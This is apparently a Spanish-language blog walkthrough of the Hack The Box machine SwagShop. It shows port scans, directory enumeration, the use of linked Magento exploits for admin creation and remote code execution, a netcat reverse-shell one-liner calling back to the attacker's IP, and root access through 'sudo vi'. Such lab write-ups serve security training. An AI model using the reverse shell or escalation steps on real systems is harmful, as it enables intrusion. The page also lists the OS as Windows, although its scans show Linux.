<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - SwagShop :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre SwagShop     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/swagshop/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - SwagShop :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Nombre SwagShop     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/swagshop/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - SwagShop :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Nombre SwagShop     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10." />
<meta property="og:url" content="https://sckull.github.io/posts/swagshop/" />
<meta property="og:site_name" content="Hack The Box - SwagShop" />
<meta property="og:image" content="https://sckull.github.io/image/htb/swagshop/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - SwagShop",
        "headline" : "Hack The Box - SwagShop",
        "description" : "Nombre SwagShop     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    MASSCAN Escaneo de puertos udp/tcp.
root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-09-28 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-09-28 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/swagshop/",
        "wordCount" : "586",
        "keywords" : [ "hackthebox","linux","CVE-2015-1397","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-09-28 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - SwagShop</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Saturday, Sep 28, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 3 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/cve-2015-1397/"><li class="fa fa-tag"></li> CVE-2015-1397</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/swagshop/../../image/htb/swagshop/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan">MASSCAN</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#gobuster">GOBUSTER</a></li>
<li><a href="#magento-ecommerce-exploit">Magento eCommerce - Exploit</a>
<ul>
<li><a href="#explotacion">Explotacion</a></li>
</ul></li>
<li><a href="#shell-www-data">SHELL - www-data</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>SwagShop</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>

<tr>
<td>Puntos</td>
<td>20</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.140</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a></td>
</tr>
</tbody>
</table>

<hr />

<h2 id="masscan">MASSCAN</h2>

<p>Escaneo de puertos udp/tcp.</p>

<pre><code class="language-bash">root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.140
Discovered open port 80/tcp on 10.10.10.140
</code></pre>

<h2 id="nmap">NMAP</h2>

<p>EScaneo de puertos 22, 80.</p>

<pre><code class="language-bash"># Nmap 7.70 scan initiated Mon May 13 12:54:19 2019 as: nmap -sV -p22,80 -o nmap.scan 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 13 12:54:27 2019 -- 1 IP address (1 host up) scanned in 8.08 seconds
</code></pre>

<h2 id="http">HTTP</h2>

<p>Visitamos la pagina principal y nos muestra una tienda con algunos productos.
<img src="../../image/htb/swagshop/Screenshot_20190513_115626.png" alt="image" /></p>

<h2 id="gobuster">GOBUSTER</h2>

<p>Algunos directorios y paginas encontradas con gobuster.</p>

<pre><code class="language-bash">=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,txt,html
[+] Timeout      : 10s
=====================================================
2019/05/13 13:05:05 Starting gobuster
=====================================================
/api.php (Status: 200)
/app (Status: 301)
/cron.php (Status: 200)
/downloader (Status: 301)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/install.php (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/LICENSE.txt (Status: 200)
/LICENSE.html (Status: 200)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)
=====================================================
2019/05/13 13:08:09 Finished
=====================================================
</code></pre>

<h2 id="magento-ecommerce-exploit">Magento eCommerce - Exploit</h2>

<p>Al investigar un poco acerca de la plataforma nos encontramos un exploit el cual crea un usuario dentro de la base de datos con permisos de administracion, editamos un poco el exploit especificamente el usuario (<code>username=&quot;sckull&quot;</code>) y contraseña (<code>password=&quot;sckull&quot;</code>) para mostrar une explotacion exitosa tambien debemos de cambiar el target con el valor de <code>target = &quot;http://10.10.10.140/index.php&quot;</code>, mas informacion acerca de esta <a href="https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/">vulnerabilidad</a>.</p>

<p><a href="https://www.exploit-db.com/exploits/37977"><strong>CVE:2015-1397</strong></a></p>

<p>Obtenemos acceso a la plataforma de Magento como administrador.
<img src="../../image/htb/swagshop/Peek 2019-05-13 21-02.gif" alt="image" /></p>

<p>Ahora que tenemos acceso a la plataforma con nuestras credenciales podemos utilizar un segundo exploit el cual executa comandos en la maquina, para ello debemos de agregar usuario (username) y contraseña (password) que creamos con el anterior exploit de igual forma agregamos la fecha que se encuentra en <code>/app/etc/local.xml</code>.</p>

<p><a href="https://www.exploit-db.com/exploits/37811"><strong>Magento CE &lt; 1.9.0.1 Post Auth RCE</strong></a></p>

<h3 id="explotacion">Explotacion</h3>

<p><img src="../../image/htb/swagshop/Peek 2019-05-13 21-123123.gif" alt="image" /></p>

<h2 id="shell-www-data">SHELL - www-data</h2>

<p>Ahora que podemos ejecutar comandos por medio de un exploit vamos a obtener una shell inversa.</p>

<p><strong>CMD:</strong></p>

<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.31 9090 &gt;/tmp/f
</code></pre>

<p><img src="../../image/htb/swagshop/Screenshot_20190514_001737.png" alt="image" /></p>

<p>Actualizamos nuestra shell a una mas estable con python.
<a href="https://netsec.ws/?p=337"><strong>SHELL:</strong></a></p>

<p><img src="../../image/htb/swagshop/Screenshot_20190514_001849.png" alt="image" /></p>

<p>Dentro de la carpeta principal del usuario haris encontramos nuestra bandera <strong>user.txt</strong>.
<img src="../../image/htb/swagshop/Screenshot_20190514_001935.png" alt="image" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>Ahora que tenemos una shell con acceso de privilegio bajo hacemos una pequeña enumeracion de los programas que podamos, por medio del comando sudo ejecutar, encontramos que podemos ejecutar vi con privilegios de administracion.</p>

<p>Para mostrar los comandos que podemos ejecutar con sudo utilizamos <code>sudo -l</code>.</p>

<p><a href="https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/"><strong>Sudo - Privilege Escalation</strong></a></p>

<p><a href="http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/"><strong>Abusing sudo</strong></a></p>

<p><img src="../../image/htb/swagshop/Screenshot_20190514_002022.png" alt="image" /></p>

<p>Utilizamos vi para poder abrir una shell como root para ello vamos a utilizar un archivo que se encuentra en <code>/var/www/html/</code> ya que es la direccion donde tiene permitido vi ejecutarse o editar archivos mediante sudo.</p>

<pre><code class="language-bash">sudo /usr/bin/vi /var/www/html/install.php
</code></pre>

<p>Luego de que se habra el editor presionamos la tecla <code>ESC</code> y escribimos <code>:shell</code> y se abrira una shell como usario <strong>root</strong>.</p>

<p><img src="../../image/htb/swagshop/Peek 2019-05-14 00-25.gif" alt="image" /></p>

<p>Obtenemos nuestra bandera <strong>root.txt</strong>.</p>

<p><img src="../../image/htb/swagshop/Screenshot_20190514_002626.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/writeup/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Writeup</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/vulnos2/">
                <span class="button__text">TryHackMe - Vulnos2</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>


<script src="https://sckull.github.io/assets/zooming.js"></script>
<script>  
  new Zooming({
   bgColor: '#000',
   bgOpacity: 0.5,
   customSize: '100%'
 }).listen('img')
</script>


  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>



</body>
</html>
